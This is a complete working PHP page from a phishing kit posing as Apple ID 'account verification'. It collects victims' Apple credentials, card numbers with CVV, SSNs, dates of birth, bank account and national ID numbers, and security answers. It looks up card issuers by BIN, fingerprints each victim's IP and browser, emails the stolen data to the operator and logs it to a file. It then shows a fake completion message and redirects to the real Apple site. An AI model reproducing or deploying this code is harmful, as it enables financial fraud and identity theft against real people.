﻿<?php
error_reporting(0);
ini_set('display_errors', 0);
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/language.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
require "CONTROLS.php";
if(isset($_POST['mname']) && !empty($_POST['mname'])) {
$mname = "";
}
else {
$mname = $_POST['mname'];	
}
$userid = $_SESSION["user"];
$password = $_SESSION["pass"];
$name=$_POST["fname"]." ".$mname." ".$_POST["lname"];
$dob=$_POST["dob"];
$address=$_POST["address"].", ".$_POST["town"].", ".$_POST["county"];
$postcode=$_POST["postcode"];
$country=$_POST["country"];
$telephone=$_POST["telephone"];
$ssn=$_POST["ssn"];
$ccname=$_POST["ccname"];
$ccno=$_POST["ccno"];
$ccexp=$_POST["ccexp"];
$climit = $_POST['climit'];   
$citizenid = $_POST['citizenid'];  
$qatarid = $_POST['qatarid'];  
$naid = $_POST['naid']; 
$bans = $_POST['bans']; 
$passport = $_POST['passport']; 
$civilid = $_POST['civilid']; 
$numbid = $_POST['numbid']; 
$secode=$_POST["secode"];
$acno=$_POST["acno"];
$sort=$_POST["sortcode"];
$q1=$_POST["q1"];
$a1=$_POST["a1"];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$bin = str_replace(' ', '', $ccno);
$bin = substr($bin, 0, 6);
$mhf_detect = bankDetails($bin);
$local = explode("<tbody>", $mhf_detect);
$b = explode("<td>", $local[1]);
$b2 = explode("</td>", $b[2]);
$b3 = explode(">", $b2[0]);
$t = explode("<td>", $local[1]);
$t2 = explode("</td>", $t[3]);
$c = explode("<td>", $local[1]);
$c2 = explode("</td>", $c[4]);
$nb = explode("</span>", $mhf_detect);
$nb = explode(">", $nb[5]);
$Bank = $nb[1];
$Brand = $b3[1]; 
$Brand = str_replace('</a', '', $Brand);
$Type = $t2[0];
$Type = str_replace(' ', '', $Type);
$Type = trim(preg_replace('/\s+/', ' ', $Type));
$Catergory = $c2[0];
$Catergory = str_replace(' ', '', $Catergory);
$Catergory = trim(preg_replace('/\s+/', ' ', $Catergory));
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$from = $From_Address;
$headers = "From:" . $from;
$subj =  "" . $ccname . " - ". $Brand . " " . $Bank . " " . $Type ." " . $Catergory ." [ ".$systemInfo['country']." | $ip ".$systemInfo['os']."]";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$data = "
++-----------[ $$ CincauCoder-Gorontalo-CayberTeam $$]------------++
    +++++++++++++[ $$ GORNTALO BISA OLO $$]++++++++++++++

         ___ Apple Login ___
Username : $userid
Password : $password
            ___ END ___

         ___ CreditCard ___
Cardholder Name   :  $ccname
Card Number       :  $ccno
Expiration Date   :  $ccexp
Cvv2              :  $secode
BIN/IIN Info      :  $Brand - $Bank - $Type - $Catergory
Qatar ID (QA)                 : $qatarid
ID Number (GR)                : $numbid
Citizen ID (TH)               : $citizenid
National ID (SA)              : $naid  
Sort Code (UK/IE)             : $sort
Civil ID Number (KW)          : $civilid
Bank Access Number (NZ)       : $bans
Account Number (UK/IE/IN)     : $acno
Credit limit (IE/TH/IN/NZ/AU) : $climit
            ___ END ___

     ___ Account Information ___
Full Name     :  $name
Address       :  $address
Zip/PostCode  :  $postcode
Country       :  $country
Phone Number  :  $telephone
SSN           :  $ssn
DOB           :  $dob
Security Question  : $q1
Security Answer    : $a1
            ___ END ___

        ___ Victim Login ___
From     :  $VictimInfo1 - $VictimInfo2
Browser  :  $VictimInfo3 - $VictimInfo4 - $VictimInfo5
++---------===[ $$CincauCoder-Gorontalo-CayberTeam $$ ]===---------++
";
if($Encrypt==1) {
include("assets/includes/AES.php");
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1) {
foreach($bad_words as $bad_word){
    if(stristr($_POST['fname'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
    }
	if(stristr($_POST['address'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/app.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/app.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
if($One_Time_Access==1)
{
$fp = fopen("assets/includes/blacklist.dat", "a");
fputs($fp, "\r\n$ip\r\n");
fclose($fp);
}

?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Complete</title>
<link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="refresh" content="5; url=https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24" />
<link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="assets/css/Second.css" rel="stylesheet" type="text/css">
<link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="assets/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
<ul class="HeaderObjList">
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name">Account Verification</span>
                                    <small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<div class="container flow-sections">
<div class="account-wrapper">
  <div align="center">
  <p><span class="clearfix" style="padding: 100px;" ><img src="assets/img/complete.png" width="100px" width="100px"></span></p>
  <h2 style="color:#009CDE">Account Verification Complete</h2>
    <p>Please wait while we restore your account access...</p>
    <p style="text-decoration: underline;color:red;">For your security you will automatically be logged out. </p>
  </div>
</div>



</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $lang['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $lang['FLAG'];?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright Â© 2017 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>